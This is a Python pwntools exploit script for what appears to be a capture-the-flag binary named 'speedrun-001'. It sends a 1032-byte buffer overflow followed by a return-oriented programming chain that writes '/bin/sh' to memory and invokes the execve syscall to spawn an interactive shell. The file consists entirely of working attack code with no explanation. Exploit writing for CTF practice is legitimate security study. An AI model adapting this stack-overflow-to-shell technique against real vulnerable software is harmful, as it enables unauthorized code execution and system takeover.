from pwn import process, packing
import codecs


def exploit():
    # 0x0000000000400686 : pop rdi ; ret
    # 0x00000000004498b5 : pop rdx ; retls
    # 0x0000000000435603 : mov qword ptr [rdi], rdx ; ret
    #
    #
    # 0x0000000000415664 : pop rax ; ret
    # 0x0000000000400686 : pop rdi ; ret
    # 0x00000000004101f3 : pop rsi ; ret
    # 0x00000000004498b5 : pop rdx ; ret
    # 0x000000000040129c : syscall
    target = process(
        "./speedrun-001")
    EMPTY_ADDR = 0x6b6000
    POP_RDI = 0x0000000000400686
    POP_RDX = 0x00000000004498b5
    MOV_RDI_RDX = 0x0000000000435603
    POP_RAX = 0x0000000000415664
    POP_RSI = 0x00000000004101f3
    SYSCALL = 0x000000000040129c

    payload = b'A' * 1032
    payload += packing.p64(POP_RDI) + packing.p64(EMPTY_ADDR)
    payload += packing.p64(POP_RDX) + packing.p64(int.from_bytes(codecs.encode("/bin/sh\x00"), "little"))
    payload += packing.p64(MOV_RDI_RDX)

    payload += packing.p64(POP_RAX) + packing.p64(0x3b)
    payload += packing.p64(POP_RDI) + packing.p64(EMPTY_ADDR)
    payload += packing.p64(POP_RSI) + packing.p64(0x0)
    payload += packing.p64(POP_RDX) + packing.p64(0x0)
    payload += packing.p64(SYSCALL)

    target.send(payload)
    target.interactive()

if __name__ == '__main__':
    exploit()


